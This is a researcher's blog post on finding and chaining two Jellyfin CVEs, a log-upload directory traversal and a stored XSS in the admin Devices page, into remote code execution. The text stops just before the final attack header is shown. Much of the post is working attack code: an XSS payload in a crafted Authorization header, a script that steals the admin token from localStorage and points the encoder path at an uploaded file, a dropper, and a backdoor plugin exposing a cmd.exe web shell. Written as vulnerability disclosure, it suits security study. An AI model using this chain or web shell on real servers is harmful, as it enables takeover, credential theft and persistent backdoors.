+++
title = "Peanut Butter Jellyfin Time"
author = ["Frederic Linn"]
date = 2023-05-07T22:49:00+02:00
draft = false
+++

<div class="verse">

"But what is best is what we saved for last. The one sure-fire thing to make your best day ever the best day ever!"<br />
<br />
--- SpongeBob, 'Jellyfishing'<br />

</div>

I always thought of getting a `CVE` as information security's rite of passage. Which is probably shallow reasoning, but the symbolic value can't be denied.

Because I really love this stuff, I decided to treat myself to my very first `CVE`! Not to please some hiring manager or human resource department, but simply to create a sense of belonging.

The following article highlights the discovery process for [CVE-2023-30626](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30626) and [CVE-2023-30627](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30627), which combined with a low-privileged user account allow for remote code execution on any unpatched `Jellyfin` instance.

We're going to talk about my approach, `Jellyfin's` internals and of course the two vulnerabilities themselves.

I'm not interested in only popping alert boxes or dropping `pwn.txt` files[^fn:1], but rather getting to know the application and creating the most impactful exploit I possibly can.


### What is Jellyfin? {#what-is-jellyfin}

> Jellyfin is the volunteer-built media solution that puts you in control of your media. Stream to any device from your own server, with no strings attached. Your media, your server, your way.

It's part of the holy _Media Server Triforce_, the two other options being `Plex` and `Emby`. `Jellyfin` is actually a fork of the latter, right before it became closed-source. You can learn more about the history of the project [here](https://jellyfin.org/docs/general/about/).

While I don't personally use `Jellyfin`[^fn:2], I'm still really impressed by the scope of the project. It just goes to show what can be achieved in the open source space with a core team and the help of numerous contributors.

Because it's a fork, there's a huge amount of legacy code and technical debt that accumulated over time.
While working in such a codebase, the decision between breaking backwards compatibility and simply _rolling with it_ frequently comes up.

From a security perspective, this is especially interesting. All those seams between new and old are a perfect place to look for little exploitable cracks.

`Jellyfin` has numerous [clients](https://jellyfin.org/downloads/clients/), but the only one we're talking about is the web client, which comes bundled with the installation by default.

Our main focus, however, lies on the server itself. It's an [ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/introduction-to-aspnet-core?view=aspnetcore-7.0) application written in `C#`, which is one of the reasons why I've picked `Jellyfin` as my research project. I feel rather comfortable in that environment.

`Jellyfin` can be installed on a variety of hosts. When not stated otherwise, assume the `Windows` build for this article.


### Methodology {#methodology}

There, I said it. The bad word. Talking about methodology is like talking about one's blogging setup. Both are highly subjective and individual topics. I feel like time may be better spend on more _concrete_ topics.

Of course that's not true at all! We can always learn by looking at how other people do things[^fn:3]. Mixing and matching of different techniques and approaches oftentimes enables us to look at a problem from a different angle.

Even though my previous research approach was more _laissez-faire_, I've still taken notes like a good boy. Not because I love optimization and hate having fun. But because wasting time has nothing to do with having fun!

Those notes enabled me to do some planning based on what did and did not work before.

The following things helped me a lot this time:

-   looking at every previous CVE
-   looking at many `Github` issues
-   grepping for interesting things like `Process.Start()`, `<Binary,Soap,Los>Formatter`, `Path.Combine()` etc. and working backwards from the call sites
-   actually playing with the application for an extended period of time
-   always taking notes of interesting quirks, assumptions and potential ideas
-   when in doubt, taking one of those assumptions and see if it holds

`Jellyfin` being an open source project makes the process a lot simpler. We have the original source code, which greatly simplifies static analysis. We can also easily set up a development environment[^fn:4], which aids with dynamic analysis.

Moreover, things like the aforementioned `Github` issues are a treasure trove of past bugs, with varying degrees of security implications. I feel like those are even more important than the previous `CVEs`, simply because many issues may be nothing more than an annoying bug for the reporter, but could actually be an indication of a more systemic issue.

If nothing else, we can get a feel for where to focus our attention.


### Authorization {#authorization}

`Jellyfin's` codebase is quite big, so we need to do exactly that: Focus our attention on a specific sub-system. A `REST API` is **always** interesting, so let's check it out.

`ASP.NET` provides a nice way of annotating individual endpoints with the `[Authorize]` [attribute](https://learn.microsoft.com/en-us/aspnet/web-api/overview/security/authentication-and-authorization-in-aspnet-web-api#using-the-authorize-attribute), which makes it immediately clear what kind of restrictions are imposed on any given route.

At first I've only looked at endpoints that can be reached unauthenticated. But given _a little_ more access in the form of a low-privileged user, we can dramatically expand the attack surface.

That's all dandy, but how do we authenticate ourselves against the `API` in practice? Just by looking at the documentation, it wasn't really clear to me how to do it. Thankfully, I've found [this](https://jmshrv.com/posts/jellyfin-api/) useful article.

There are two main ways[^fn:5] of passing authentication tokens:

-   via the `Authorization` header
-   via a custom `X-Emby-Token` header

The value of the latter is an actual session token as one would expect. But the value of the former is a little funky:

```text
 MediaBrowser Client="Jellyfin Web", Device="Firefox", DeviceId="TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo5", Version="10.8.9", Token="<your-session-token>"
```

A rather unusual `Authorization` header, that's for sure. When used for authentication, those values end up in an [AuthenticationRequest](https://github.com/jellyfin/jellyfin/blob/a3c9edde347122437e988aac9eb5dacb08f0c345/MediaBrowser.Controller/Session/AuthenticationRequest.cs), which stores the details of the session. But what makes it more than a curiosity is the fact that many of these value are implicitly trusted all over the codebase. Let's have a look at an example.


### Traversing Directories Left and Right (CVE-2023-30626) {#traversing-directories-left-and-right--cve-2023-30626}

`Jellyfin` has an [endpoint](https://github.com/jellyfin/jellyfin/blob/22d880662283980dec994cd7d35fe269613bfce3/Jellyfin.Api/Controllers/ClientLogController.cs#L44) that allows clients to upload log files. It is enabled by default. The `POST` request's body gets copied to the file _as is_.

Ultimately, we end up in this method:

```csharp { linenos=true, linenostart=1, hl_lines=["3-4"] }
public async Task<string> WriteDocumentAsync(string clientName, string clientVersion, Stream fileContents)
{
    var fileName = $"upload_{clientName}_{clientVersion}_{DateTime.UtcNow:yyyyMMddHHmmss}_{Guid.NewGuid():N}.log";
    var logFilePath = Path.Combine(_applicationPaths.LogDirectoryPath, fileName);
    await using var fileStream = new FileStream(logFilePath, FileMode.CreateNew, FileAccess.Write, FileShare.None);
    await fileContents.CopyToAsync(fileStream).ConfigureAwait(false);
    return fileName;
}
```

A malicious user has control over every parameter via the `Authorization` header! The two strings are being interpolated into a filename in line 3. Said filename gets combined with a base path for log files into the final path.

Let's have a look at a debugging session for the method:

{{< figure src="/peanut-butter-jellyfin-time_directory-traversal.png" caption="<span class=\"figure-number\">Figure 1: </span>Debugging view of WriteDocumenetAsync()" >}}

When creating a session, we specified a `clientName` of `\..\..\ROFL`. This will let us write the file _one_ directory above the intended one.
But why do we have to reference the parent _two_ times?

Well, the first slash terminates the mandatory `upload_` prefix, which makes it a directory. We then reference the "parent", which gets rid of the fake `upload_` directory entirely. One more pair of dots finally allow us to break out of the logging directory.

Here's some code for clarification:

```csharp { linenos=true, linenostart=1 }
var path = @"C:\Users\superflyjohnson\AppData\Local\jellyfin\log\upload_\..\..\ROFL_1337_20230417073110_265506028b294d9a97564509e8a9e32e.log";
var canonicalPath = new Uri(path).LocalPath;
Console.WriteLine(canonicalPath);
// Output: "C:\Users\superflyjohnson\AppData\Local\jellyfin\ROFL_1337_20230417073110_265506028b294d9a97564509e8a9e32e.log"
```

A classic directory traversal that actually popped up [somehwere else](https://github.com/jellyfin/jellyfin/commit/f61d18612b2e6c6e9a5dd4510331ac8d89a337d5) before.

It looks like this particular issue was introduced [here](https://github.com/jellyfin/jellyfin/commit/c534c450330759f6595c9601e3fe8b12e6987e69#diff-2cea0a137aa1c0d17dc7d9fa3067b048dce5a5be11e5e3bda33ea5fccb819ab0) and merged into master [here](https://github.com/jellyfin/jellyfin/pull/5918#event-5580709083), which makes it present since version `v10.8.0-alpha2`.

Alright, we have a file write with partially controlled name and **fully** controlled content. The only restriction is a 1MB limit for the content.

There has to be _something_ interesting we can do with this, right?

Right?


#### Many dead ends {#many-dead-ends}

I've tried quite a lot of things in order to exploit the file write. Feel free to skip the next couple of sections of trial and error. Feel even _more_ free to tell [me](/about) about your ideas!


##### T-800 {#t-800}

If we could control where the filename gets terminated, we'd be able to provide our own extension. Sadly that's not possible, as the `NUL` byte aka `\0` counts as an [invalid](https://learn.microsoft.com/en-us/dotnet/api/system.io.path.getinvalidpathchars?view=net-7.0#remarks) path character.

We could try something funny with `Unicode` (🤡), but let's just accept the `.log` extension for the moment.


##### Insider Threats {#insider-threats}

A great first choice is staying inside the `Jellyfin` ecosystem, so I've looked into their [plugin system](https://jellyfin.org/docs/general/server/plugins/). They use auto-discovery of `DLLs` in the process of loading plugins, which ultimately brings us to [DiscoverPlugins()](https://github.com/jellyfin/jellyfin/blob/22d880662283980dec994cd7d35fe269613bfce3/Emby.Server.Implementations/Plugins/PluginManager.cs#L666).

The first obstacle: Only sub directories of the `plugin` directory get enumerated. We can only write a file, not create a directory, though. But wait, there's already a `config` folder present by default! That'll work, but our hopes get shattered a few lines later:

```csharp
 entry.DllFiles = Directory.GetFiles(entry.Path, "*.dll", SearchOption.AllDirectories);
```

Only files ending in `.dll` are picked up, huh.

So while learning about the plugins didn't yield immediate results, we're going the apply that knowledge later.


##### Windows Autostart {#windows-autostart}

Next up a classic: Putting a file into the user's autostart directory. We _can_ write into it, but because `Windows` places a lot of importance on file extensions, only `Notepad` will pop up and display our `.log` file. I guess we could mount a social engineering attack:

> ATTENTION! We've encrypted all your files. For further instructions, please change the extension of that **other** file to .exe and double click it.

100% guaranteed, every time 🤥.

I really thought having full control over the content and partial control over the name would be an easy win.

It turns out the other way around would be simpler to exploit, as demonstrated by Stephen Röttger in his [Chrome sandbox escape](https://googleprojectzero.blogspot.com/2020/02/escaping-chrome-sandbox-with-ridl.html). He writes a cookie file, which is basically a `SQLite` database, into the autostart directory and inserts a command disguised as a cookie. Because he controls the extension (`.bat`), `Windows` will execute the command-as-cookie inside the `SQLite` database file just fine. Brilliant!


##### 2023 is the Year of 🐧 on the Desktop {#2023-is-the-year-of-on-the-desktop}

We've hit a dead end on `Windows`, so maybe focusing on another operating system is the right move. There's an official `Docker` image and while the installation instructions mention the possibility of running as an unprivileged user, running as _superprivileged_ `root` is still the default.

Because we're `root`, we can write **anywhere**. So what are our options?

Linux has the `~/.config/autorun` directory. Usually, `.desktop` files reside there specifying which applications to run on startup. But no luck: It turns out the extension _has_ to be `.desktop`!

Another option is writing [crontab snippets](https://unix.stackexchange.com/a/458715) directly into the `/etc/cron.d` directory, which could make scheduling the execution of another binary dropped by us via the `/ClientLog/Document` endpoint possible.

A quick scan of the manpage yields this:

> [Files] cannot contain any dots.

I would've been really devastated if the very idea wasn't flawed to begin with.

We're still inside a container, where only **one** process gets executed on startup anyway. So without fiddling around, no cron jobs are executed.


### I Have Something in Store for You (CVE-2023-30627) {#i-have-something-in-store-for-you--cve-2023-30627}

A _lot_ of dead ends. Yeah, yeah, we gained precious knowledge - It's true!

But I didn't want to give up just yet. We have to achieve the ultimate goal in life:

**Remote Code Execution**

It looks like our file write alone is not enough. What would be enough, though?

Looking through the endpoints, it became clear that an admin account can do **a lot** of interesting things. Not quite executing code, but close enough.

Because of that powerful `API`, all we realistically need is a `XSS` vulnerability inside the web client. So let's find one!


#### The Hunt for XSS {#the-hunt-for-xss}

There are two relatively new `CVEs` for `XSS` issues in the web client, so maybe we're onto something.

We know that the session values from the `Authorization` header are implicitly trusted all over the codebase. Maybe that's also the case for the web client?
Looking around the admin dashboard, we can see the `Devices` section:

{{< figure src="/peanut-butter-jellyfin-time_dashboard-devices.png" caption="<span class=\"figure-number\">Figure 2: </span>Devices section of the admin dashboard" >}}

Promising indeed, but how does the responsible code look?

```js { linenos=true, linenostart=1, hl_lines=["9"] }
// devices.js
//---snip---
function load(page, devices) {
    const localeWithSuffix = getLocaleWithSuffix();

    let html = '';
    html += devices.map(function (device) {
        let deviceHtml = '';
        deviceHtml += "<div data-id='" + device.Id + "' class='card backdropCard'>";
//---snip---
```

Oh oh. The plus sign. Cross-site scripting's best friend.

This really is a textbook example of a `Stored XSS` vulnerability. They've been escaping strings [for some time](https://github.com/jellyfin/jellyfin-web/commit/59adbc348a37bccc8f9a277378e863efbe95497a) now. Not nearly enough, though!

Nice, that was a lot quicker than I imagined.

Digging around, it looks like the issue was present since at least [here](https://github.com/jellyfin/jellyfin-web/commit/1c06eed0985da6bded90c3c26fb99a8ef61c3f86), which would mean version `10.1.0` (the oldest release on `Github`).


#### Proof of Concept {#proof-of-concept}

In order to trigger the vulnerability, we can create a new session with a crafted `DeviceId`:

```text
 [...] DeviceId="' onmouseover=alert(document.domain) data-lol='" [...]
```

We close the expected `HTML` attribute with a single quote, insert a malicious event handler attribute and finish with our own data-attribute that contains another single quote to match the closing quote from the expected attribute.

Attribute. Quote.

Doing anything fancier than an `alert()` proves to be difficult. That's because all those values from the `Authorization` header get parsed by a scary looking piece of [code](https://github.com/jellyfin/jellyfin/blob/3c22d5c9705921672a932192d016933ef5900001/Jellyfin.Server.Implementations/Security/AuthorizationContext.cs#L286), which means we cannot easily use quotation marks.

Single quotes are also iffy, because we're in the middle of said event handler attribute. Maybe something can be done with different encodings, but:
Dealing with encodings is never fun, so let's make it easy for ourselves. Thankfully, inline scripts are not blocked via [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), which allows the usage of `eval()`.

In order to get around the quotation marks for the string `eval()` expects as an argument, we can use `String.fromCharCode()`:

```text
 [...] DeviceId="' onmouseover=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59)) data-lol='" [...]
```

The payload is the same as above, but it certainly makes us look _way_ more legit, right?


### Getting Jiggy Wit It {#getting-jiggy-wit-it}

Our goal is still `RCE`.

The simplest way would be to enable a new package source and install a malicious plugin from there. While this should work with a couple of `API` calls, we'd need to host said repository somewhere.

Let's find us another, more convoluted way!


#### Drop It Like It's Hot {#drop-it-like-it-s-hot}

The `REST API` features an endpoint for changing the `media encoder` (basically `ffmpeg`) path, probably out of necessity for the first-time setup.

Said encoder binary always runs _out of process_, meaning it gets started via `Process.Start()`. We already scanned the repository for it. Why? Because it's always a potential vector for `RCE`.

Do you remember our file write from before? Forget about the directory traversal, all we need is the _unrestricted content_ part.
Maybe we can trick `Jellyfin` into executing our malicious log file, even with the `.log` extension?

As luck has it, we can **absolutely** do that! Every time a new path is provided, it gets [validated](https://github.com/jellyfin/jellyfin/blob/4b2b46c8f3d98227b01d57cd3f4805e65ddac727/MediaBrowser.MediaEncoding/Encoder/MediaEncoder.cs#L270). Thankfully for us, validation involves _calling_ the binary:

```csharp { linenos=true, linenostart=1, hl_lines=["14"] }
// EncoderValidator.cs
private string GetProcessOutput(string path, string arguments, bool readStdErr, string? testKey)
{
    using (var process = new Process()
    {
        StartInfo = new ProcessStartInfo(path, arguments)
        {
        // ---snip---
        }
    })
    {
        _logger.LogDebug("Running {Path} {Arguments}", path, arguments);

        process.Start();

        if (!string.IsNullOrEmpty(testKey))
        {
            process.StandardInput.Write(testKey);
        }

        return readStdErr ? process.StandardError.ReadToEnd() : process.StandardOutput.ReadToEnd();
    }
}
```

Booyakasha!

That's really the best case scenario: Our own code runs, but validation fails and the actual media encoder doesn't get replaced.

We could stop right here and execute some off-the-shelf payload, but let's get even more convoluted!

Conceptually, we can think of our malicious log file as a [dropper](https://en.wikipedia.org/wiki/Dropper_(malware)). Wich makes sense for the 1MB limit we're facing. It only contains the next stage and therefore looks rather simple:

```csharp { linenos=true, linenostart=1 }
const string dll = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4<and so on>";

var basePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
var pluginDirectory = Path.Combine(basePath, @"jellyfin\plugins\PWN_1.3.3.7");
Directory.CreateDirectory(pluginDirectory);

var fullPath = Path.Combine(pluginDirectory, "Jellyfinito.dll");
File.WriteAllBytes(fullPath, Convert.FromBase64String(dll));
```

Now for the more interesting part: What's inside the dropped `DLL`?


#### GOING UNDERCOVER {#going-undercover}

I've told you we'd make use of our plugin knowledge! Why a plugin? On my resume, I'd put:

> In order to gain persistent access to the target machine, a malicious implant in the form of a custom application plugin is deployed (see `CWE-553`).

But, you know, the reason is much simpler: I find it really funny.

The `Jellyfin` team provides a template [repository](https://github.com/jellyfin/jellyfin-plugin-template/blob/master/README.md). From the `README` we learn about all the different interfaces we can implement in order to add functionality.

As we've already noted, the server uses auto-discovery-reflection-magic on startup to load plugins and provides different hooks for the code at runtime.

So what _is_ inside our plugin `DLL`? Let's start with the most straightforward part, an additional endpoint:

```csharp { linenos=true, linenostart=1, hl_lines=["6"] }
using Microsoft.AspNetCore.Mvc;
namespace JellyfinBackdoorPlugin;

public class PluginController : ControllerBase
{
    [HttpGet("/api/pwn/{command}")]
    public IActionResult ExecuteCommand(string command)
    {
        var fullCommand = $"/c {command}";
        var proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = fullCommand;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        var output = proc.StandardOutput.ReadToEnd();

        return Ok(output);
    }
}
```

The above is a standard `ASP.NET` controller. Embedding external controllers is not a Jellything, but actually encouraged by `Microsoft's` official [documentation](https://learn.microsoft.com/en-us/aspnet/core/mvc/advanced/app-parts?view=aspnetcore-7.0).

We specify the route to our controller in line six and use part of the `URL` to execute a command on the server. You know, the usual `web shell` stuff.

We could, of course, add the almighty endpoint of the [previous](/blog/privesc-part-2) article, which would allow us to do slightly fancier `web shell` stuff.

Enough serious business! Let's have some fun.

After seeing the `IIntroProvider` interface in the aforementioned plugin template repository, I was sold. Of _course_ we're using our ability to execute arbitrary code on the machine to let an annoying intro play before every other video.

In order for this to work, we need some preparation. Thankfully, there's the `IServerEntryPoint` interface, which lets us run code on startup.

```csharp { linenos=true, linenostart=1, hl_lines=["14","23-24"] }
using System.IO;
using MediaBrowser.Controller.Configuration;
using Microsoft.Extensions.DependencyInjection;
using MediaBrowser.Controller.Entities.Movies;
using MediaBrowser.Controller.Library;
using MediaBrowser.Controller.Plugins;

namespace JellyfinBackdoorPlugin;

public class BackdoorStartup : IServerEntryPoint
{
    private readonly IServiceProvider _serviceProvider;
    private const string _guidString = "13371337-1337-1337-1337-133713371337";
    private byte[] introBytes = new byte[] { 0x00,0x00,0x00,0x20,0x66,0x74,0x79,0x70,0x69, <and so on>};

    public BackdoorStartup(IServiceProvider serviceProvider)
    {
        _serviceProvider = serviceProvider;
    }

    public async Task RunAsync()
    {
        var libraryManager = _serviceProvider.GetRequiredService<ILibraryManager>();
        var configManager = _serviceProvider.GetRequiredService<IServerConfigurationManager>();

        var item = libraryManager.GetItemById(_guidString);
        if (item != null)
        {
            libraryManager.DeleteItem(item, new DeleteOptions { DeleteFileLocation = false, DeleteFromExternalProvider = false });
        }

        var introPath = $"{configManager.ApplicationPaths.TempDirectory}\\intro.mp4";
        File.WriteAllBytes(introPath, introBytes);

        var movie = new Movie();

        movie.Path = introPath;
        movie.Id = Guid.Parse(_guidString);

        libraryManager.CreateItem(movie, null);
    }

    public void Dispose() {}
}
```

A few things are interesting here. In line 14, the intro is provided as a raw byte array as opposed to our usual `Base64` encoded string.

Remember: Our original dropper can only be 1MB. It contains the `DLL` and _it_ contains the intro. Matryoshka style.

Without fetching any more resources, we're quite limited in size. `Base64` has an average overhead of about 33%, which we simply cannot afford here!

Next up, lines 23 to 24 show how to dynamically retrieve important classes via [dependency injection](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-7.0). The details are not important, but suffice it to say we're _deep_ inside `Jellyfin` at this point.

Alright, we've dropped our intro video and registered it. Let's have a look at the final 🧩, the `IntroProvider` itself:

```csharp { linenos=true, linenostart=1 }
using Jellyfin.Data.Entities;
using MediaBrowser.Controller.Configuration;
using MediaBrowser.Controller.Entities;
using MediaBrowser.Controller.Library;
using Microsoft.Extensions.DependencyInjection;

namespace JellyfinBackdoorPlugin;

public class BackdoorIntro : IIntroProvider
{
    private const string _guidString = "13371337-1337-1337-1337-133713371337";
    private readonly IServiceProvider _serviceProvider;

    public BackdoorIntro(IServiceProvider serviceProvider)
    {
        _serviceProvider = serviceProvider;
    }

    public async Task<IEnumerable<IntroInfo>> GetIntros(BaseItem item, User user)
    {

        var configManager = _serviceProvider.GetRequiredService<IServerConfigurationManager>();

        var info = new IntroInfo { Path = $"{configManager.ApplicationPaths.TempDirectory}\\intro.mp4", ItemId = Guid.Parse(_guidString) };
        var infos = new List<IntroInfo> { info };
        return infos;
    }

    public string Name { get; }
}
```

Neither the `item` about to be played, nor the `user` requesting it are of interest to us. We always return the same intro that we registered in the previous step.


#### Full Chain {#full-chain}

That was quite a lot, so let's go through the steps again:

1.  Create a new session with a crafted `Authorization` header:
    -   MAGIC_PWN_STRING as `Client` or `Version`
    -   our XSS exploit as `DeviceId`
2.  Upload the malicious logfile
3.  (Admin hovers over our device in dashboard)
4.  `XSS` payload will:
    -   construct the correct path to the logfile
    -   change media encoder path to the logfile (validation -&gt; **RCE**)
    -   shut down the server
5.  Malicious logfile will:
    -   create a new plugin subdirectory
    -   place our own plugin `DLL` inside it
6.  (Someone restarts the server manually)
7.  Our plugin gets loaded and does:
    -   provide a startup routine, which writes a video inside `Jellyfin's` temp directory
    -   register that file within `Jellyfin` so that our intro provider is able to reference it
    -   provide a bonus in the form of a new endpoint that executes commands

We **definitely** found a more convoluted way, that's for sure!

Here's the `XSS` exploit that ties everything together.

```js { linenos=true, linenostart=1 }
(async function() {
const gradient = "background: linear-gradient(180deg, rgba(255, 0, 0, 1) 0%, rgba(255, 255, 0, 1) 33%, rgba(0, 192, 255, 1) 66%, rgba(192, 0, 255, 1) 100%";

console.warn("%c                                             ", gradient);
console.warn(
`%c      _  _
  o     // //       /)o       o _/_
 ,  _  // // __  , //,  _ _  ,  /  __
/|_(/_(/_(/_/ (_/_//_(_/ / /_(_(__(_)
/)             / /)
/             ' (/         -- GEBIRGE (2023)
`, "color: #d33682");
console.warn("%c                                             ", gradient);

const wilhelm = new Audio("https://upload.wikimedia.org/wikipedia/commons/d/d9/Wilhelm_Scream.ogg");
wilhelm.volume = 0.2;
wilhelm.play();
const cardImages = document.getElementsByClassName("cardImage");
for (const cardImage of cardImages) {
    cardImage.style.backgroundImage="url(http://www.sherv.net/cm/emoticons/trollface/big-troll-smiley-emoticon.jpeg)";
}

// Thankfully the authentication token is stored inside localStorage.
const token = JSON.parse(localStorage.jellyfin_credentials).Servers[0].AccessToken;

const baseHeaders = {
    "X-Emby-Token": token,
};

// We need the full path to our malicious executable.
// The first part is the configured path for log files.
let response = await fetch("/System/Info", {
    headers: baseHeaders,
});
const systemInfo = await response.json();
const logPath = systemInfo.LogPath;

// The second part is the filename itself.
// Because we don't control the full filename, we filter for our magic substring.
response = await fetch("/System/Logs", {
    headers: baseHeaders
});
const logFiles = await response.json();
const maliciousLogfile = logFiles.find(l => l.Name.includes("MAGIC_PWN_STRING")).Name;

const fullPath = `${logPath}\\${maliciousLogfile}`;

// Now we try changing the encoder path.
// This won't work, but our binary will already have run at this point.
const encoderRequest = {
    "Path": fullPath,
    "PathType": "custom",
};

await fetch("/System/MediaEncoder/Path", {
    method: "POST",
    headers: {
        ...baseHeaders,
        "Content-Type": "application/json",
    },
    body: JSON.stringify(encoderRequest),
});

// Our malicious plugin only gets loaded once the server restarts,
// so let's shut it down to cut the workload in half :^).
await fetch("/System/Shutdown", {
method: "POST",
    headers: baseHeaders,
});
})()
```

A few API calls, an anonymous `async` function that gets called directly after its definition. Nothing too crazy.

As you remember, we want to pass that script to `eval()` via `String.fromCharCode()`. `CyberChef` got us [covered](https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Charcode('Comma',10)&input=KGFzeW5jIGZ1bmN0aW9uKCkgewpjb25zdCBncmFkaWVudCA9ICJiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTgwZGVnLCByZ2JhKDI1NSwgMCwgMCwgMSkgMCUsIHJnYmEoMjU1LCAyNTUsIDAsIDEpIDMzJSwgcmdiYSgwLCAxOTIsIDI1NSwgMSkgNjYlLCByZ2JhKDE5MiwgMCwgMjU1LCAxKSAxMDAlIjsKCmNvbnNvbGUud2FybigiJWMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBncmFkaWVudCk7CmNvbnNvbGUud2FybigKYCVjICAgICAgXyAgXwogIG8gICAgIC8vIC8vICAgICAgIC8pbyAgICAgICBvIF8vXwogLCAgXyAgLy8gLy8gX18gICwgLy8sICBfIF8gICwgIC8gIF9fCi98XygvXygvXygvXy8gKF8vXy8vXyhfLyAvIC9fKF8oX18oXykKLykgICAgICAgICAgICAgLyAvKQovICAgICAgICAgICAgICcgKC8gICAgICAgICAtLSBHRUJJUkdFICgyMDIzKQpgLCAiY29sb3I6ICNkMzM2ODIiKTsKY29uc29sZS53YXJuKCIlYyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIsIGdyYWRpZW50KTsKCmNvbnN0IHdpbGhlbG0gPSBuZXcgQXVkaW8oImh0dHBzOi8vdXBsb2FkLndpa2ltZWRpYS5vcmcvd2lraXBlZGlhL2NvbW1vbnMvZC9kOS9XaWxoZWxtX1NjcmVhbS5vZ2ciKTsKd2lsaGVsbS52b2x1bWUgPSAwLjI7CndpbGhlbG0ucGxheSgpOwpjb25zdCBjYXJkSW1hZ2VzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgiY2FyZEltYWdlIik7CmZvciAoY29uc3QgY2FyZEltYWdlIG9mIGNhcmRJbWFnZXMpIHsKICAgIGNhcmRJbWFnZS5zdHlsZS5iYWNrZ3JvdW5kSW1hZ2U9InVybChodHRwOi8vd3d3LnNoZXJ2Lm5ldC9jbS9lbW90aWNvbnMvdHJvbGxmYWNlL2JpZy10cm9sbC1zbWlsZXktZW1vdGljb24uanBlZykiOwp9CgovLyBUaGFua2Z1bGx5IHRoZSBhdXRoZW50aWNhdGlvbiB0b2tlbiBpcyBzdG9yZWQgaW5zaWRlIGxvY2FsU3RvcmFnZS4KY29uc3QgdG9rZW4gPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5qZWxseWZpbl9jcmVkZW50aWFscykuU2VydmVyc1swXS5BY2Nlc3NUb2tlbjsKCmNvbnN0IGJhc2VIZWFkZXJzID0gewogICAgIlgtRW1ieS1Ub2tlbiI6IHRva2VuLAp9OwoKLy8gV2UgbmVlZCB0aGUgZnVsbCBwYXRoIHRvIG91ciBtYWxpY2lvdXMgZXhlY3V0YWJsZS4KLy8gVGhlIGZpcnN0IHBhcnQgaXMgdGhlIGNvbmZpZ3VyZWQgcGF0aCBmb3IgbG9nIGZpbGVzLgpsZXQgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgiL1N5c3RlbS9JbmZvIiwgewogICAgaGVhZGVyczogYmFzZUhlYWRlcnMsCn0pOwpjb25zdCBzeXN0ZW1JbmZvID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwpjb25zdCBsb2dQYXRoID0gc3lzdGVtSW5mby5Mb2dQYXRoOwoKLy8gVGhlIHNlY29uZCBwYXJ0IGlzIHRoZSBmaWxlbmFtZSBpdHNlbGYuCi8vIEJlY2F1c2Ugd2UgZG9uJ3QgY29udHJvbCB0aGUgZnVsbCBmaWxlbmFtZSwgd2UgZmlsdGVyIGZvciBvdXIgbWFnaWMgc3Vic3RyaW5nLgpyZXNwb25zZSA9IGF3YWl0IGZldGNoKCIvU3lzdGVtL0xvZ3MiLCB7CiAgICBoZWFkZXJzOiBiYXNlSGVhZGVycwp9KTsKY29uc3QgbG9nRmlsZXMgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CmNvbnN0IG1hbGljaW91c0xvZ2ZpbGUgPSBsb2dGaWxlcy5maW5kKGwgPT4gbC5OYW1lLmluY2x1ZGVzKCJNQUdJQ19QV05fU1RSSU5HIikpLk5hbWU7Cgpjb25zdCBmdWxsUGF0aCA9IGAke2xvZ1BhdGh9XFwke21hbGljaW91c0xvZ2ZpbGV9YDsKCi8vIE5vdyB3ZSB0cnkgY2hhbmdpbmcgdGhlIGVuY29kZXIgcGF0aC4KLy8gVGhpcyB3b24ndCB3b3JrLCBidXQgb3VyIGJpbmFyeSB3aWxsIGFscmVhZHkgaGF2ZSBydW4gYXQgdGhpcyBwb2ludC4KY29uc3QgZW5jb2RlclJlcXVlc3QgPSB7CiAgICAiUGF0aCI6IGZ1bGxQYXRoLAogICAgIlBhdGhUeXBlIjogImN1c3RvbSIsCn07Cgphd2FpdCBmZXRjaCgiL1N5c3RlbS9NZWRpYUVuY29kZXIvUGF0aCIsIHsKICAgIG1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogewogICAgICAgIC4uLmJhc2VIZWFkZXJzLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICB9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoZW5jb2RlclJlcXVlc3QpLAp9KTsKCi8vIE91ciBtYWxpY2lvdXMgcGx1Z2luIG9ubHkgZ2V0cyBsb2FkZWQgb25jZSB0aGUgc2VydmVyIHJlc3RhcnRzLAovLyBzbyBsZXQncyBzaHV0IGl0IGRvd24gdG8gY3V0IHRoZSB3b3JrbG9hZCBpbiBoYWxmIDpeKS4KYXdhaXQgZmV0Y2goIi9TeXN0ZW0vU2h1dGRvd24iLCB7Cm1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogYmFzZUhlYWRlcnMsCn0pOwp9KSgpCg).

Here's the final `Authorize` header used for the attack:

```text
